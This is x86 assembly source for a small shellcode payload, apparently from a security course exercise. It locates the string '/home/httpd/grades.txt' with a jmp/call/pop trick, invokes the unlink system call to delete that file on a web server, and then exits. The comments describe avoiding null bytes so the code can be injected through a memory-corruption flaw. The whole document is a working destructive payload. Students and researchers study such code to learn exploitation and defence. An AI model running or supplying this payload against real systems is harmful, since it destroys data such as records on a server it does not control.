#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txt"
#define STRLEN	22

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl    %esi
    xorl    %eax,%eax               /* get a 32-bit zero value */
    xorl    %ebx,%ebx               /* get a 32-bit zero value */

	movl    $0x0a,%eax              /* arg 1: syscall number */
    movl    %esi,%ebx               /* arg 2: fd */
    int     $0x80                   /* invoke syscall: sys_unlink */

    xorl    %ebx,%ebx               /* arg 2: 0 */
    movl    %ebx,%eax
    inc     %eax                    /* arg 1: SYS_exit (1), uses mov+inc to avoid null byte */
    int     $0x80                   /* invoke syscall */

 calladdr:
	call	popladdr
	.asciz	STRING
